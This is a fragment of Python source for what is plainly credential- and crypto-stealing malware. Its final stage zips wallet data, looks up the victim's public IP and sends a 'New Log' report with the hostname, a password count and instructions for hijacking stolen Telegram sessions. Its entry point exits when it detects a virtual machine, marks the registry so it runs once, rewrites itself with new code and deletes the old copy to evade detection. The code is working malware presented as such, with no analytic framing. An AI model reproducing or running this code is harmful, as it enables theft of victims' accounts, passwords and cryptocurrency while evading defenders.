        create_and_send_zip(wal_dir, "wallets", "Crypto wallets")

    try:
        pub_ip = urlopen(Request("https://api.ipify.org"), timeout=10).read().decode()
    except:
        pub_ip = "N/A"

    password_summary = f"Passwords found: {len(all_passwords)}" if all_passwords else "No passwords found"

    instructions = (
        f"**💀 New Log**\n"
        f"**PC:** {socket.gethostname()}\n"
        f"**IP:** {pub_ip}\n"
        f"**Date:** {current_date}\n"
       "   IMPORTANT: do not play on VAC-secured servers.\n\n"
        "**💼 Telegram accounts:**\n"
        "Replace tdata folder in %APPDATA%/Telegram Desktop/\n\n"
        "**💰 Crypto Wallets:**\n"
        "Wallet data has been sent in wallets.zip"
    )

    send_info(data={"content": instructions})

    try:
        shutil.rmtree(BASE, ignore_errors=True)
        log("Cleaned up temporary files")
    except Exception as e:
        log(f"Cleanup error: {e}")

    log("EXTRACTION COMPLETE")
    log(f"Log saved to: {LOG_FILE}")


if __name__ == "__main__":
    try:
        r = detect_vm()
        if r.is_vm:
            log(f"VM detected! Confidence: {r.confidence:.0%}")
            log("Exiting to avoid detection...")
            sys.exit(0)
        else:
            log(f"No VM detected (confidence: {r.confidence:.0%})")

        if is_do(APP_NAME):
            log("Already ran once! Exiting...")
            sys.exit(0)
        else:
            do_mark(APP_NAME)
            log("First run - registry marked")

        main()

        if not IS_FROZEN:
            new_mult = MULTIPLIER + 1
            new_file, old_file = mutate_script(new_mult)
            if new_file and old_file:
                time.sleep(2)
                self_delete(old_file)

    except Exception as e:
        log(f"FATAL ERROR: {e}")
        import traceback

        log(traceback.format_exc())
